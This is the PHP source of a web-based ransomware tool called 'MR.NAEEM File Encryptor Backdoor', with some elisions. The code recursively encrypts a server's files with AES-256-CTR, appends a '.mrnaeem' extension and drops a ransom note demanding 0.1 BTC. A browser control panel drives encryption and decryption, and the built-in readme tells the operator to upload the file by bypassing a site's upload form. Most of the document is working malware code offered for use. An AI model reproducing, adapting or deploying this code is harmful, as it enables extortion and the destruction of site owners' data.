 ...
 * The files will encrypted with AES-256-CTR.
 * 
 * DISCLAIMER!!!
 *
 ...
 * @author	Mr. Naeem a.k.a Muhammad Ridwan Na'im
 ...
 * 
 */
define('MESSAGE', "Hey, your security sucks. We have encrypted your files. Send me 0.1BTC as a public key to decrypt your files!\n\nNEVER TRY TO BRUTEFORCE OR GUESS THE DECRYPTOR KEY. IF YOU ENTERED INCORRECT KEYS, YOU WILL LOSE YOUR FILES FOREVER!!!\n\nEmail : mrnaeem@protonmail.ru");
...
class Encryptor
{
	 ...
	 *
	 * @var $extEncrypted string
	 **/
	protected string $extEncrypted = '.mrnaeem';
	 ...
	 * @var $messages string
	 **/
	protected string $messages = MESSAGE;

	/**
	 * Filetype to be encrypt
	 *
	 * @var $targetFileExtension array
	 **/
	protected array $targetFileExtension = array(
    ...
    private function encryptedFile($src_file = NULL)
    {
    	return $src_file.$this->extEncrypted;
    }

	/**
	 * Encrypt the file and saves the result in a new file with $extEncrypted as suffix.
	 * 
    ...
    {
		$key 	= substr(sha1((string)$this->key, true), 0, 32);
	    ...
	    {    
	        ...
	        if ($wt_encrypted_content = fopen($source, 'rb')) 
	        {
	            ...
	            {
	                $plaintext = fread($wt_encrypted_content, $iv_length * FILE_ENCRYPTION_BLOCKS);
	        ...
	        {
	            $this->messageResult[] = 'Failed to Open Source File.'.$source;
	        }
	        fclose($ct_encrypted_file);
	    } 
	    else 
	    {
	        $this->messageResult[] = 'Failed to Create Encrypted file.';
	    }
    }

    public function scanDir()
    {
		$src_path = '/' . rtrim((string)$this->srcPath, '/') . '/';
    	$this->srcPath = str_replace('/', DIRECTORY_SEPARATOR, $src_path);

		$ext_bracket = '{'.implode(',', (array)$this->targetFileExtension).'}';
    	...
    	{
    		$this->messageResult[] = 'Directory Target not Found!';
    	}
    }

    public function doEncrypt()
    {
    	$src_files = $this->scanDir();
    	...
    	if(!empty($src_files))
    	{
	    	foreach ($src_files as $key => $file)
	    	{
	    		...
	    		{
		    		if($this->_encrypt($src_files[$key], $this->encryptedFile($src_files[$key])) == true)
	    ...
	    {
	    	$this->messageResult[] = "Directory is Empty or file extension you selected doesn't exist.";
	    }
    }
    ...
    public function directoryListing()
    {
    	...
    	if(!empty($src_files))
    	{
	    	foreach ($src_files as $key => $file)
	    	{
	    		if(WHOAMI !== $src_files[$key])
	    		{
		    		$this->messageResult[] = $src_files[$key].' => '.$this->encryptedFile($src_files[$key]);
		    	}
	    	}

	    	$this->messageResult[] = '<p style="color:#00FF11;">Files Encrypted! <b>Your Key is '.$this->key.'</b></p>';
	    }
    }

    public function showResults()
    {
    	return implode('<br/>', (array)$this->messageResult);
    }

    public function createMessage()
    {
    	$message = empty($this->messages) ? MESSAGE : $this->messages;

    	if(is_dir(BASEPATH . DIRECTORY_SEPARATOR . $this->srcPath))
    	{
	    	$filename = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 16);
	    	$msg_file = fopen(BASEPATH . DIRECTORY_SEPARATOR . $this->srcPath . $filename.'.readme', 'w');
			fwrite($msg_file, $message);
			fclose($msg_file);
		}
		else
		{
			$this->messageResult[] = 'Failed to Create Message. Target Path not Found.';
		}
    }
}
...
class Decryptor
{
    ...
    private function decryptedFilename($src_file = NULL)
    {
    	return str_replace((string)$this->extEncrypted, '', $src_file);
    }
	    ...
	    if ($fpOut = fopen($dest, 'w')) 
	    {
	        if ($fpIn = fopen($source, 'rb')) 
	        {
	            ...
	            while (!feof($fpIn)) 
	            {
	                ...
	                $ciphertext = fread($fpIn, $iv_length * (FILE_ENCRYPTION_BLOCKS + 1));
	        ...
	        {
            	$this->messageResult[] = 'Failed to Open Encrypted File.';
        	}
	    } 
	    else 
	    {
	        $this->messageResult[] = 'Failed to Create Decrypting file.';
	    }
    }
    ...
    private function scanDir()
    {
    	...
    	if(is_dir($dir))
    	{
    		$dir_content = glob($dir . '*'.$this->extEncrypted);
    		return $dir_content;
    	}
    	else
    	{
    ...
    public function doDecrypt()
    {
    	...
    	if(!empty($src_files))
    	{
	    	foreach ($src_files as $key => $file)
	    	{
	    		if($this->_decrypt($src_files[$key], $this->decryptedFilename($src_files[$key])) == true)
	    		unlink($src_files[$key]);
	    	}

	    	$this->messageResult[] = '<p style="color:#00FF11;">Files Decrypted!</p>';
	    }
	    else
	    {
	    	$this->messageResult[] = "Directory is Empty or encrypted extension doesn't exist.";
	    }
    }
	...
	public function directoryListing()
    {
    	...
    	if(!empty($src_files))
    	{
	    	foreach ($src_files as $key => $file)
	    	{
	    		if(WHOAMI !== $src_files[$key])
	    		{
		    		$this->messageResult[] = $src_files[$key].' => '.$this->decryptedFilename($src_files[$key]);
		    	}
	    	}
	    }
    }
...
<html>
	<head>
		...
		switch ($title) {
			case 'enc':
				$title = 'MR.NAEEM FILE ENCRYPTOR '.VERSION;
				break;
			
			case 'dec':
				$title = 'MR.NAEEM FILE DECRYPTOR '.VERSION;
				break;
	...
	<body>
		...
		<div class="centered">
			<div class="header">
				...
				<br/>
				<div class="menu">
					<a href="?p=home&m=enc">Encrypt</a>
					<a href="?p=home&m=dec">Decrypt</a>
					<a href="?p=home&m=readme">Readme</a>
				</div>
			</div>
			<br/>
		<!-- ENCRYPT FORM -->
		...
		if(isset($_GET['m']) && preg_replace('/[^a-z]*$/', '', $_GET['m']) == 'enc') { ?>
			...
			<form id="form" action="?p=home&act=encrypt" method="post">
				...
				Encrypted extension <input type="text" id="ext" name="enc_ext" placeholder='Encrypted files extension. Default : mrnaeem'>
				Message to your Target <textarea id="victimmessages" placeholder="Message to your Target..." style="margin-top:1rem;" name="message"></textarea>
				<button type="submit" id="encrypt" name="encrypt" style="margin-top:1rem;" class="button">Encrypt!</button>
			</form>

			<div id="message" class="message defaultmessages"> mrnaeem@earth$ sudo mrnaeem show copyright<br/>Mr.Naeem &copy; <?= date('Y');?> Now and Forever
			</div>
			<div id="typewritter" class="message result" style="display:none;">
				mrnaeem@earth$ sudo mrnaeem do encrypt<br/>
				Encrypting files in <div class="config"></div>
				<br/><br/>...<br/>
				<div id="terminal_process" class="terminal_process"></div>
			</div>
			<script>
		    document.getElementById("encrypt").addEventListener("click", function(event){
		        ...
		        $.ajax({
		            ...
		            success: function(data) {
		                if (data.status == 1) {
		                	$('.defaultmessages').hide();
		                    $('.result').show();
		                    $('.config').html(data.path + ' as ' + data.ext + ' with key ' + data.key);
		                    $('.terminal_process').html(data.result);
							const targetNode = document.getElementById("typewritter");

							// Observer untuk mendeteksi perubahan pada elemen
							const observer = new MutationObserver(function(mutationsList, observer) {
								mutationsList.forEach(mutation => {
									if (mutation.type === "childList") {
										// Jika efek typing selesai (misalnya tidak ada "_" lagi)
										if (!mutation.target.innerText.includes("_")) {
											$('#encrypt').prop('disabled', false);
											$('#encrypt').html('Encrypt!');
											observer.disconnect(); // Hentikan observer setelah selesai
										}
									}
								});
							});
		                    ...
		                    new TypingText(document.getElementById("typewritter"), 1, function(t){
								var i = new Array("_", "_", "_", "_");
								return " " + i[t.length % i.length];
							});
							TypingText.runAll();
							$('#encrypt').prop('disabled', true);
		        			$('#encrypt').html('Encrypting files...');
							setTimeout(function() {
								$('#encrypt').prop('disabled', false);
								$('#encrypt').html('Encrypt!');
							}, 5000); // Sesuaikan durasi dengan panjang teks
		                }
		            }
		        });
		        return false;
		...
		<?php } elseif(isset($_GET['m']) && $_GET['m'] == 'dec') { ?>
			...
			<form id="form" action="?p=home&act=decrypt" method="post">
				...
				Encrypted extension <input type="text" id='ext' name="enc_ext" placeholder="Encrypted file extension which you decrypt. Default : mrnaeem">
				<button type="submit" id='decrypt' name="decrypt" style="margin-top:1rem;" class="button">Decrypt!</button>
			</form>
			<div id="message" class="message defaultmessages"> mrnaeem@earth$ sudo mrnaeem show copyright<br/>Mr.Naeem &copy; <?= date('Y');?> Now and Forever
			</div>
			<div id="typewritter" class="message result" style="display:none;">
				mrnaeem@earth$ sudo mrnaeem do decrypt<br/>
		        ...
		        $.ajax({
		            ...
		            success: function(data) {
		                if (data.status == 1) {
							...
							// Konfigurasi Observer
							observer.observe(targetNode, { childList: true, subtree: true });
		                    new TypingText(document.getElementById("typewritter"),1,function(t){var i=new Array("_","_","_","_");return" "+i[t.length%i.length]}),
							TypingText.runAll();
							$('#decrypt').prop('disabled', true);
		        			$('#decrypt').html('Decrypting files...');
							setTimeout(function() {
								$('#decrypt').prop('disabled', false);
								$('#decrypt').html('Decrypt!');
							}, 5000); // Sesuaikan durasi dengan panjang teks
		...
		<?php } else { ?>
			...
			<div class="readme">
				<h2>MR.NAEEM File Encryptor Backdoor <?= VERSION; ?></h2>

				<p>Upload this file with bypassing site's form upload and Remote from browser. Fill the configuration form and let this file do the magic! The files will be encrypted with AES-256-CTR.</p>
				...
				<ol>
					...
					<ul>
						...
						<li>Specify the encrypted file extension. Default: mrnaeem</li>
...
elseif(isset($_GET['act']) && $_GET['act'] == 'encrypt') 
{
	if(isset($_POST['encrypt']))
	{
		...
		$path = $_POST['path'];
		$enc_ext = (isset($_POST['enc_ext']) && $_POST['enc_ext'] !== '') ? '.'.$_POST['enc_ext'] : '.mrnaeem';
		$message = $_POST['message'];
		
		$config['key'] = $key;
		$config['srcPath'] = $path;
		$config['extEncrypted'] = $enc_ext;
		$config['messages'] = $message;

		$encrypt = new Encryptor($config);
		$encrypt->directoryListing();

		sleep(5);
		$encrypt->createMessage();
		$encrypt->doEncrypt();
		$array_data = array('status' => 1, 
			'result' => $encrypt->showResults(),
			'key' => $key,
...
elseif (isset($_GET['act']) && $_GET['act'] == 'decrypt') 
{
	if(isset($_POST['decrypt']))
	{
		...
		$decrypt->directoryListing();

		sleep(5);
		$decrypt->doDecrypt();
		$array_data = array('status' => 1, 
			'result' => $decrypt->showResults(),
			'key' => $key,
			'path' => BASEPATH . str_replace('/', DIRECTORY_SEPARATOR, $path),
			'ext' => $enc_ext
		);
...
{
	header('location:?p=home&m=readme');
	exit;
}
?>